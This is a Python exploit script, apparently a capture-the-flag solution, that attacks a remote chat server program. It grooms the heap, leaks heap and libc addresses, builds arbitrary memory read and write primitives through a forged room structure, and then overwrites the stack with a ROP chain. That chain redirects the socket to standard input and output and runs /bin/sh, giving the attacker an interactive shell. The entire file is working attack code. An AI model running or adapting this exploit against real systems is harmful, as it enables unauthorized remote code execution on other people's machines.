#!/usr/bin/env python3

import argparse
import os
import sys
import time
from libchat import *

context.log_level = 'debug'


context.update(arch="amd64", os="linux")



libc = ELF('./libc.so.6', checksec=False)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Server host")
    parser.add_argument("port", type=int, help="Server port")
    args = parser.parse_args()

    h = args.host
    p = args.port

    r = connect(h, p, b"AAAA")
    dummy = connect(h,p, b"D" * 0x30)

    for i in range(14):

        create_room(r, b"r" + str(i).encode())
        recv_response(r)



    for i in range(0,7):
        delete_room(r, b'r' + str(i).encode())
        recv_response(r)
    

    delete_room(r, b'r8')
    recv_response(r)

    delete_room(r, b'r9')
    recv_response(r)
    delete_room(r, b'r10')
    recv_response(r)


    delete_room(r, b'r11')
    recv_response(r)
    

    delete_room(r, b'r12')
    recv_response(r)
    dummy.close()

    # Now there is a heap address in the unsortedbin 
    # Make some allocations so that we can allocate a RoomInto_t aligned to 
    # leak us the heap address

    dummy = connect(h,p, b'\x00' * 0x10) 

    connections = []


    for i in range(7):
        connections.append(connect(h, p, b'A' * 0x210))
        connections.append(connect(h, p, b'A' * 0x200))


    connections.append(connect(h, p, b'D' * 0x340))
    
    time.sleep(1)

    create_room(r, b"TARGET")
    recv_response(r)
    edit_room(r, b"TARGET", b"A"*256) 
    recv_response(r)
    list_rooms(r)

    r.recvuntil("A"*256)
    heap_leak = u64(r.recv(7).ljust(8, b'\x00')) - 0x3d30
    log.info('heap leak @ ' + hex(heap_leak))

    connections.append(connect(h,p, b'D' * 0x400))
    connections.append(connect(h,p, b'D' * 0x400))
    connections.append(connect(h,p, b'D' * 0x2e0))

    # With a heap leak, we can read from any pointer by using the fact 
    # that room allocations are not nulled. This lets us create a fake room 
    # by reusing a room chunk for some other type that we control. Using a 
    # roominfo type as the fake room, we can use the edit_room feature
    # to control fake_room->room_info which lets us read an write arbitrarily. 


    create_room(r, b"t0")
    recv_response(r)

    create_room(r, b"t1")
    recv_response(r)
    create_room(r, b"t2")
    recv_response(r)
    create_room(r, b"t3")
    recv_response(r)
    create_room(r, b"t4")
    recv_response(r)
    create_room(r, b"t5")
    recv_response(r)
    create_room(r, b"t6")
    recv_response(r)
    create_room(r, b"t7")
    recv_response(r)
    create_room(r, b"t8")
    recv_response(r)
    create_room(r, b"t8")
    recv_response(r)
    create_room(r, b"t9")
    recv_response(r)

    delete_room(r, b"t8")
    recv_response(r)
    delete_room(r, b"t0")
    recv_response(r)
    delete_room(r, b"t1")
    recv_response(r)
    delete_room(r, b"t2")
    recv_response(r)
    delete_room(r, b"t3")
    recv_response(r)
    delete_room(r, b"t4")
    recv_response(r)
    delete_room(r, b"t5")
    recv_response(r)
    delete_room(r, b"t6")
    recv_response(r)
    delete_room(r, b"t7")
    recv_response(r)
    delete_room(r, b"t9")
    recv_response(r)

    for i in range(6):
        connections.append(connect(h, p, b'A' * 0x210))
        connections.append(connect(h, p, b'A' * 0x200))

    connections.append(connect(h, p, b'A' * 0x200))
    connections.append(connect(h, p, b'A' * 0x400))
    connections.append(connect(h, p, b'A' * 0x260))

    fake_owner = p64(0x4141414141414141) # trivial but must not have nulls
    fake_info = p64(heap_leak + 0x30a8) # must point to readable memory
    
    fake_room = fake_owner + fake_info 
    current_name = fake_room[:-2]
    current_val = 0
    create_room(r, fake_room)
    recv_response(r)
    list_rooms(r)

    r.recvuntil(fake_room)

    read_val = u64(r.recv(11)[2:9].ljust(8, b'\x00'))
    print(hex(read_val))
    libc_base = read_val - 0x204160 
    libc.address = libc_base
    log.info("libc @ " + hex(libc_base))

    def read64(addr):
        fake_owner = p64(0x4141414141414141)
        fake_info = p64(addr) 
        
        fake_room = fake_owner + fake_info
        nonlocal current_name
        edit_room(r, current_name, fake_room)
        recv_response(r)
        current_name = fake_room[:-2]

        list_rooms(r)
        r.recvuntil(fake_room)
        read_val = u64(r.recv(11)[2:9].ljust(8, b'\x00'))
        nonlocal current_val
        current_val = read_val
        return read_val

    stack = read64(libc.symbols['environ'])

    def write64(addr, val):
        fake_owner = p64(heap_leak + 0xe80)[:-2]
        fake_name = b'A'*8 + p64(addr)[:-2]
        nonlocal current_name
        edit_room(r, current_name, fake_name)
        recv_response(r)
        current_name = fake_name
        edit_room(r, current_name, b'A' + fake_owner)
        recv_response(r)
        current_name = b'A' + fake_owner
        edit_room(r, current_name, fake_owner)
        recv_response(r)
        list_rooms(r)
        r.recvuntil(fake_owner)
        read_val = u64(r.recv(11)[4:].ljust(8, b'\x00'))
        print(hex(read_val)) 
        edit_room(r, p64(read_val)[:-2], val)

    rop = ROP(libc)

    pop_rax = rop.find_gadget(['pop rax', 'ret']).address
    pop_rbx = rop.find_gadget(['pop rbx', 'ret']).address
    pop_rcx = rop.find_gadget(['pop rcx', 'ret']).address
    pop_rdx = rop.find_gadget(['pop rdx', 'leave', 'ret']).address

    pop_rdx = libc.address + 0x00000000000b0133

    pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    syscall = rop.find_gadget(['syscall', 'ret']).address

    binsh_offset = next(libc.search(b'/bin/sh\x00'))

    dup2 = p64(pop_rdi) + \
           p64(39) + \
           p64(pop_rsi) + \
           p64(0) + \
           p64(pop_rax) + \
           p64(0x21) + \
           p64(syscall) + \
           p64(pop_rsi) + \
           p64(1) + \
           p64(pop_rax) + \
           p64(0x21) + \
           p64(syscall) + \
           p64(pop_rsi) + \
           p64(2) + \
           p64(pop_rax) + \
           p64(0x21) + \
           p64(syscall)

    binsh = p64(pop_rdi) + \
              p64(binsh_offset) + \
              p64(pop_rsi) + \
              p64(0) + \
              p64(pop_rdx) +\
              p64(0) * 3 + \
              p64(pop_rax) + \
              p64(0x3b) + \
              p64(syscall)

    payload = dup2 + binsh

    winner = remote(h, p)

    write64(stack - 0x5f0, p64(libc_base + 0x00000000001737eb) + b'AAAAA' + payload)

    winner.interactive();

if __name__ == "__main__":
    main()
